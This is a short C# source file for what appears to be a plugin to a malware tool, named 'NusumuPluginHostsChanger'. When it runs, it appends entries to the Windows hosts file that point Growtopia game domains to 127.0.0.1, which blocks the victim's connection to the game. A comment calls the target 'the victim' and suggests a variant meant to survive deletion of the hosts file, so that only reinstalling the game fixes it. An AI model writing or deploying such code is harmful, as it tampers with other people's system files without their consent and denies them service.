using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NusumuPlugintest
{
    public class NusumuPluginHostsChanger
    {
        //DO NOT ADD PARAMETERS!
        //Plugin will not work with parameters ex: Execute(object obj1, object obj2)
        public static void Execute()
        {
            var systemPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
            Console.WriteLine(systemPath);
            var path = Path.Combine(systemPath, @"drivers\etc\hosts");
            using (var stream = new StreamWriter(path, true, Encoding.Default))
            {
                stream.WriteLine("\n" +
                    "127.0.0.1 growtopia1.com\n" +
                    "127.0.0.1 growtopia1.com\n");/*If you want you can change them to 127.0.0.1 growtopia7.com
             that will make the victim unable to connect also this can not be fixed by deleting hosts file, the only fix is reinstalling growtopia.*/
            }
        }
    }
}
